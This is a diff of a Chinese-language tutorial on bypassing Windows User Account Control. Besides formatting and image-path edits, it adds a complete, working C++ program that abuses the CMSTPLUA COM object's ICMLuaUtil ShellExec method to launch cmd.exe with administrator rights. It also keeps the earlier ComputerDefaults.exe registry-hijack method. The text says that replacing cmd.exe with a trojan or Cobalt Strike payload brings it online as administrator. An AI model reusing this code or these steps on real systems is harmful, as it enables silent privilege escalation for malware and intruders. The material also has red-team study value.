@@ -4,15 +4,13 @@ UAC，全称为User Account Control（用户账户控制），是Windows Vista�
 
 UAC通过在执行可能需要管理员权限的任务时弹出提示窗口，要求用户确认操作或者输入管理员账户的密码，从而实现对可能的危险行为的监控和控制。这个特性使得恶意软件在未经用户许可的情况下更难以在系统中执行危险的操作，提高了系统的安全性
 
-8
-
 在Visual Studio中，你可以通过修改项目的manifest文件来配置User Account Control（用户账户控制，UAC）设置。这个文件是一个XML文件，它定义了应用程序的配置属性，其中一个属性就是UAC设置
 
 - `asInvoker`：这是默认值。当这个值被设置时，应用程序会以启动它的用户的权限运行。如果应用程序被普通用户启动，它将会以普通权限运行；如果应用程序被管理员启动，它将以管理员权限运行。
 - `highestAvailable`：当这个值被设置时，应用程序会尽可能地获取最高权限。如果应用程序被管理员启动，它将会以管理员权限运行；如果应用程序被普通用户启动，它将以普通权限运行。
 - `requireAdministrator`：当这个值被设置时，应用程序总是以管理员权限运行。如果应用程序被普通用户启动，UAC会弹出一个对话框，要求用户输入管理员账户的密码
 
-<img src="uac白名单挖掘/image-20230622121843399.png" alt="image-20230622121843399" style="zoom:67%;" />	
+<img src="BypassUac/image-20230622121843399.png" alt="image-20230622121843399" style="zoom:67%;" />	
 
 
 
@@ -39,7 +37,7 @@ UAC（User Account Control）白名单挖掘是一种常见的权限提升技术
 
 我们正在寻找满足以下几个条件的白名单程序：
 
-- 程序的 manifest 文件中的 autoElevate 属性必须配置为 true，这允许程序在无需用户干预的情况下自动获取提升的权限。
+- 程序的 `manifest` 文件中的 `autoElevate` 属性必须配置为 `true`，这允许程序在无需用户干预的情况下自动获取提升的权限。
 - 程序执行时不能弹出 UAC（用户账户控制）对话框，这确保了程序的无缝执行，不会因 UAC 对话框的出现而中断用户的工作流。
 - 程序需要能够查询注册表中的 `Shell\Open\command` 键。这是因为 `shell\open\command` 键值通常用于存储特定类型的可执行程序文件路径。当这种特定类型的程序运行时，系统会在注册表中查找并执行对应的 `shell\open\command` 键值中指定的程序。这一属性允许我们通过改变该键值中的程序路径，将我们所需的程序插入到某些特定的系统操作中
 
@@ -57,9 +55,9 @@ UAC（User Account Control）白名单挖掘是一种常见的权限提升技术
 .\sigcheck64.exe -m C:\windows\system32\ComputerDefaults.exe
 ```
 
-![image-20230622164747889](uac白名单挖掘/image-20230622164747889.png)
+![image-20230622164747889](BypassUac/image-20230622164747889.png)
 
-![image-20230622165311813](uac白名单挖掘/image-20230622165311813.png)
+![image-20230622165311813](BypassUac/image-20230622165311813.png)
 
 
 
@@ -163,45 +161,45 @@ C:\Windows\System32\Sysprep\sysprep.exe
 
 这里还需注意一点，有个别程序会弹出uac框的，例如changepk.exe，这个程序在windows11不会弹uac，但是在windows10会弹uac
 
-<img src="uac白名单挖掘/image-20230623183142614.png" alt="image-20230623183142614" style="zoom:67%;" />	
+<img src="BypassUac/image-20230623183142614.png" alt="image-20230623183142614" style="zoom:67%;" />	
 
 
 
 ### 2.调用`Shell\Open\command`键
 
-打开ProcessMonitor捕捉ComputerDefaults.exe的运行信息，在Filter工具栏设置`Process Name`为`ComputerDefaults.exe`，`Result`设置为`NAME NOT FOUND`
+打开`ProcessMonitor`捕捉`ComputerDefaults.exe`的运行信息，在Filter工具栏设置`Process Name`为`ComputerDefaults.exe`，`Result`设置为`NAME NOT FOUND`
 
-<img src="uac白名单挖掘/image-20230622165530035.png" alt="image-20230622165530035" style="zoom:67%;" />	
+<img src="BypassUac/image-20230622165530035.png" alt="image-20230622165530035" style="zoom:67%;" />	
 
-<img src="uac白名单挖掘/image-20230622165809092.png" alt="image-20230622165809092" style="zoom:67%;" />	
+<img src="BypassUac/image-20230622165809092.png" alt="image-20230622165809092" style="zoom:67%;" />	
 
 
 
-随后运行ComputerDeafaults，ProcessMonitor立马会显示关于此程序的相关信息
+随后运行`ComputerDeafaults`，`ProcessMonitor`立马会显示关于此程序的相关信息
 
-![image-20230622165919733](uac白名单挖掘/image-20230622165919733.png)
+![image-20230622165919733](BypassUac/image-20230622165919733.png)
 
 ​			
 
-注意此路径`HKCU\Software\Classes\ms-settings\Shell\Open\command`, 这行的操作是`RegQueryKey`，表示查询注册表的一个键
+注意此路径`HKCU\Software\Classes\ms-settings\Shell\Open\command`, 这行的操作是`RegOpenKey`，表示打开注册表的一个键
 
 > 在注册表中，键相当于目录，它们可以包含其他键（相当于子目录）或键值（相当于文件）。一个键通常不直接包含数据，数据是存储在键值中的
 
-<img src="uac白名单挖掘/image-20230622194233641.png" alt="image-20230622194233641" style="zoom:67%;" />	
+<img src="BypassUac/image-20230622194233641.png" alt="image-20230622194233641" style="zoom:67%;" />	
 
 
 
 打开注册表，新建上述的键`ms-settings\Shell\Open\command`
 
-<img src="uac白名单挖掘/image-20230622195409277.png" alt="image-20230622195409277" style="zoom:67%;" />	
+<img src="BypassUac/image-20230622195409277.png" alt="image-20230622195409277" style="zoom:67%;" />	
 
 
 
-再用ProcessMonitor捕捉ComputerDefaults的信息，发现它还会去查询`DelegateExecute`键值，操作为`RegQueryValue`，表示查询注册表的键值
+再用`ProcessMonitor`捕捉`ComputerDefaults`的信息，发现它还会去查询`DelegateExecute`键值，操作为`RegQueryValue`，表示查询注册表的键值
 
 > 在注册表中，键值是存储实际数据的地方，例如，可以在一个键值中存储一个字符串、一个数字或一个二进制数据
 
-![image-20230622200928739](uac白名单挖掘/image-20230622200928739.png)
+![image-20230622200928739](BypassUac/image-20230622200928739.png)
 
 
 
@@ -209,13 +207,13 @@ C:\Windows\System32\Sysprep\sysprep.exe
 
 > Windows注册表中，每个键下面都有一个被称为“默认”或“(默认)”的键值。你可以将其视为该键的默认数据。当你访问一个键而不指定键值的名称时，将返回此默认键值的数据
 
-<img src="uac白名单挖掘/image-20230622201650750.png" alt="image-20230622201650750" style="zoom:67%;" />	
+<img src="BypassUac/image-20230622201650750.png" alt="image-20230622201650750" style="zoom:67%;" />	
 
 
 
 再次运行ComputerDefaults，会弹出系统管理员权限的cmd，也就是说如果我们将cmd.exe替换成shellcode木马的路径，那么就能获得管理员权限的shell
 
-![image-20230622202206176](uac白名单挖掘/image-20230622202206176.png)
+![image-20230622202206176](BypassUac/image-20230622202206176.png)
 
 
 
@@ -229,7 +227,7 @@ C:\Windows\System32\Sysprep\sysprep.exe
 
 
 
-# bypass的实现
+# 修改注册表BypassUAC
 
 ## 实现思路
 
@@ -413,13 +411,305 @@ int main()
 
 执行程序后返回一个管理员权限的cmd				
 
-![动画](uac白名单挖掘/动画.gif)
+![动画](BypassUac/动画.gif)
 
 
 
 如果我们将cmd.exe替换成cs木马的地址，那么cs就会以管理员权限上线
 
-![动画](uac白名单挖掘/动画-16874925352742.gif)
+![动画](BypassUac/动画-16874925352742.gif)
+
+
+
+# 通过Com组件BypassUAC
+
+## 什么是Com组件
+
+COM（Component Object Model）是微软提出的一种软件组件体系结构，广泛应用于Windows操作系统。它允许开发人员创建可重用的对象，这些对象能够在多个程序或项目中交互。COM是一种语言无关的技术，意味着可以用多种编程语言创建和使用COM对象。下面是COM的一些主要特点和概念：
+
+### 1.对象和接口
+
+- **对象**：在COM中，对象是具体实现，它们包含数据和操作这些数据的代码。对象通常是由类实例化而成。
+- **接口**：接口是一组相关函数的集合，它定义了对象的行为。接口是与对象分离的，这意味着多个对象可以实现同一个接口。
+
+
+
+### 2.类ID和接口ID
+
+- **类ID (CLSID)**：每个COM对象都有一个唯一的CLSID，用于在系统中标识对象。
+- **接口ID (IID)**：每个接口都有一个唯一的IID，用于识别接口。
+
+
+
+### 3.COM库和函数
+
+COM提供了一系列库和函数来支持对象的创建、管理和通信
+
+例如使用`CoCreateInstance` 和`CoInitialize`函数来创建COM对象和初始化COM库
+
+
+
+### 4.注册与发现
+
+COM对象通常在注册表中注册，这样客户端程序就可以发现和创建对象
+
+
+
+## 实现思路
+
+在COM组件中有一个名为`ICMLuaUtil`的接口，该接口提供了一个名为`ShellExec`的函数，它可以启动具有更高权限的进程
+
+
+
+### 1.创建高权限COM对象
+
+首先定义了一个`CoCreateInstanceAsAdmin`的函数，该函数使用了COM的`CoGetObject`方法来尝试以管理员权限创建COM对象并返回`ICMLuaUtil`接口的指针
+
+```cpp
+// 以管理员权限创建COM对象 
+HRESULT CoCreateInstanceAsAdmin(HWND hwnd, REFCLSID rclsid, REFIID riid, __out void** ppv)
+{
+
+	BIND_OPTS3 bo;
+	WCHAR  wszCLSID[50];
+	WCHAR  wszMonikerName[300];
+
+    // 将CLSID转换为字符串
+	StringFromGUID2(rclsid, wszCLSID, sizeof(wszCLSID) / sizeof(wszCLSID[0]));
+	
+    // 构造Moniker字符串，用于指定要以管理员权限创建或获取的对象
+    // Moniker字符串包含了必要的信息来定位和激活COM对象
+    HRESULT hr = StringCchPrintf(wszMonikerName, sizeof(wszMonikerName) / sizeof(wszMonikerName[0]), L"Elevation:Administrator!new:%s", wszCLSID);
+	if (FAILED(hr))
+		return hr;
+	
+    // 初始化BIND_OPTS3结构
+    memset(&bo, 0, sizeof(bo));
+	bo.cbStruct = sizeof(bo);
+	bo.hwnd = hwnd;
+	bo.dwClassContext = CLSCTX_LOCAL_SERVER;
+
+    // 使用CoGetObject和构造的Moniker字符串来获取或创建COM对象
+    // 如果对象不存在，Moniker机制可能会触发对象的创建
+    // 函数返回获取的接口指针
+	return CoGetObject(wszMonikerName, &bo, riid, ppv);
+}
+```
+
+
+
+### 2.调用ShellExec方法
+
+在`CMLuaUtilBypassUAC`函数中，创建了高权限的COM对象并调用其`ICMLuaUtil`接口的`ShellExec`方法，以此启动高权限的进程
+
+```cpp
+// 绕过UAC的函数
+BOOL CMLuaUtilBypassUAC(LPWSTR lpwszExecutable, LPCTSTR szArg)
+{   
+	HRESULT hr = 0;  
+	CLSID clsidICMLuaUtil = { 0 };
+	IID iidICMLuaUtil = { 0 };
+	ICMLuaUtil* CMLuaUtil = NULL;
+	BOOL bRet = FALSE;
+
+    // 将字符串转换成CLSID和IID
+	CLSIDFromString(CLSID_CMSTPLUA, &clsidICMLuaUtil);
+	IIDFromString(IID_ICMLuaUtil, &iidICMLuaUtil);
+
+    // 创建具有管理员权限的COM对象
+	CoCreateInstanceAsAdmin(NULL, clsidICMLuaUtil, iidICMLuaUtil, (PVOID*)(&CMLuaUtil));
+	
+    // 调用COM对象中的ICMLuaUtil接口的ShellExec方法
+    hr = CMLuaUtil->lpVtbl->ShellExec(CMLuaUtil, lpwszExecutable, szArg, NULL, 0, SW_SHOW);
+	CMLuaUtil->lpVtbl->Release(CMLuaUtil);
+    
+	if (GetLastError())
+	{
+		return FALSE;
+	}
+	else {
+		return TRUE;
+	}
+}
+```
+
+
+
+## 完整代码
+
+```cpp
+#include "windows.h"
+#include <objbase.h>
+#include <strsafe.h>
+
+
+// 定义用于创建COM对象的CLSID和IID
+#define CLSID_CMSTPLUA                     L"{3E5FC7F9-9A51-4367-9063-A120244FBEC7}"
+#define IID_ICMLuaUtil                     L"{6EDD6D74-C007-4E75-B76A-E5740995E24C}"
+
+// 定义ICMLuaUtil接口及其方法
+typedef interface ICMLuaUtil ICMLuaUtil;
+
+typedef struct ICMLuaUtilVtbl {
+    BEGIN_INTERFACE
+    
+    // 以下都是接口方法的定义
+    HRESULT(STDMETHODCALLTYPE* QueryInterface)(
+        __RPC__in ICMLuaUtil* This,
+        __RPC__in REFIID riid,
+        _COM_Outptr_  void** ppvObject);
+
+    ULONG(STDMETHODCALLTYPE* AddRef)(
+        __RPC__in ICMLuaUtil* This);
+
+    ULONG(STDMETHODCALLTYPE* Release)(
+        __RPC__in ICMLuaUtil* This);
+
+    HRESULT(STDMETHODCALLTYPE* Method1)(
+        __RPC__in ICMLuaUtil* This);
+
+    HRESULT(STDMETHODCALLTYPE* Method2)(
+        __RPC__in ICMLuaUtil* This);
+
+    HRESULT(STDMETHODCALLTYPE* Method3)(
+        __RPC__in ICMLuaUtil* This);
+
+    HRESULT(STDMETHODCALLTYPE* Method4)(
+        __RPC__in ICMLuaUtil* This);
+
+    HRESULT(STDMETHODCALLTYPE* Method5)(
+        __RPC__in ICMLuaUtil* This);
+
+    HRESULT(STDMETHODCALLTYPE* Method6)(
+        __RPC__in ICMLuaUtil* This);
+
+    HRESULT(STDMETHODCALLTYPE* ShellExec)(
+        __RPC__in ICMLuaUtil* This,
+        _In_     LPCWSTR lpFile,
+        _In_opt_  LPCTSTR lpParameters,
+        _In_opt_  LPCTSTR lpDirectory,
+        _In_      ULONG fMask,
+        _In_      ULONG nShow
+        );
+
+    HRESULT(STDMETHODCALLTYPE* SetRegistryStringValue)(
+        __RPC__in ICMLuaUtil* This,
+        _In_      HKEY hKey,
+        _In_opt_  LPCTSTR lpSubKey,
+        _In_opt_  LPCTSTR lpValueName,
+        _In_      LPCTSTR lpValueString
+        );
+
+    HRESULT(STDMETHODCALLTYPE* Method9)(
+        __RPC__in ICMLuaUtil* This);
+
+    HRESULT(STDMETHODCALLTYPE* Method10)(
+        __RPC__in ICMLuaUtil* This);
+
+    HRESULT(STDMETHODCALLTYPE* Method11)(
+        __RPC__in ICMLuaUtil* This);
+
+    HRESULT(STDMETHODCALLTYPE* Method12)(
+        __RPC__in ICMLuaUtil* This);
+
+    HRESULT(STDMETHODCALLTYPE* Method13)(
+        __RPC__in ICMLuaUtil* This);
+
+    HRESULT(STDMETHODCALLTYPE* Method14)(
+        __RPC__in ICMLuaUtil* This);
+
+    HRESULT(STDMETHODCALLTYPE* Method15)(
+        __RPC__in ICMLuaUtil* This);
+
+    HRESULT(STDMETHODCALLTYPE* Method16)(
+        __RPC__in ICMLuaUtil* This);
+
+    HRESULT(STDMETHODCALLTYPE* Method17)(
+        __RPC__in ICMLuaUtil* This);
+
+    HRESULT(STDMETHODCALLTYPE* Method18)(
+        __RPC__in ICMLuaUtil* This);
+
+    HRESULT(STDMETHODCALLTYPE* Method19)(
+        __RPC__in ICMLuaUtil* This);
+
+    HRESULT(STDMETHODCALLTYPE* Method20)(
+        __RPC__in ICMLuaUtil* This);
+    END_INTERFACE
+} *PICMLuaUtilVtbl;
+
+interface ICMLuaUtil
+{
+    CONST_VTBL struct ICMLuaUtilVtbl* lpVtbl;
+};
+
+// 以管理员权限创建COM对象 
+HRESULT CoCreateInstanceAsAdmin(HWND hwnd, REFCLSID rclsid, REFIID riid, __out void** ppv)
+{
+
+	BIND_OPTS3 bo;
+	WCHAR  wszCLSID[50];
+	WCHAR  wszMonikerName[300];
+
+    // 将CLSID转换为字符串
+	StringFromGUID2(rclsid, wszCLSID, sizeof(wszCLSID) / sizeof(wszCLSID[0]));
+	
+    // 创建绑定名称
+    HRESULT hr = StringCchPrintf(wszMonikerName, sizeof(wszMonikerName) / sizeof(wszMonikerName[0]), L"Elevation:Administrator!new:%s", wszCLSID);
+	if (FAILED(hr))
+		return hr;
+	
+    // 初始化BIND_OPTS3结构
+    memset(&bo, 0, sizeof(bo));
+	bo.cbStruct = sizeof(bo);
+	bo.hwnd = hwnd;
+	bo.dwClassContext = CLSCTX_LOCAL_SERVER;
+
+    // 创建COM对象
+	return CoGetObject(wszMonikerName, &bo, riid, ppv);
+}
+
+// 绕过UAC的函数
+BOOL CMLuaUtilBypassUAC(LPWSTR lpwszExecutable, LPCTSTR szArg)
+{   
+	HRESULT hr = 0;
+	CLSID clsidICMLuaUtil = { 0 };
+	IID iidICMLuaUtil = { 0 };
+	ICMLuaUtil* CMLuaUtil = NULL;
+	BOOL bRet = FALSE;
+
+    // 将字符串转换成CLSID和IID
+	CLSIDFromString(CLSID_CMSTPLUA, &clsidICMLuaUtil);
+	IIDFromString(IID_ICMLuaUtil, &iidICMLuaUtil);
+
+    // 创建具有管理员权限的COM对象
+	CoCreateInstanceAsAdmin(NULL, clsidICMLuaUtil, iidICMLuaUtil, (PVOID*)(&CMLuaUtil));
+	
+    // 使用COM对象执行ShellExec方法
+    hr = CMLuaUtil->lpVtbl->ShellExec(CMLuaUtil, lpwszExecutable, szArg, NULL, 0, SW_SHOW);
+	CMLuaUtil->lpVtbl->Release(CMLuaUtil);
+    
+	if (GetLastError())
+	{
+		return FALSE;
+	}
+	else {
+		return TRUE;
+	}
+}
+
+int main() {
+
+	CoInitialize(NULL);
+	CMLuaUtilBypassUAC((LPWSTR)L"cmd.exe",NULL);
+	CoUninitialize();
+	return 0;
+}
+```
+
+
+
+
 
 
 
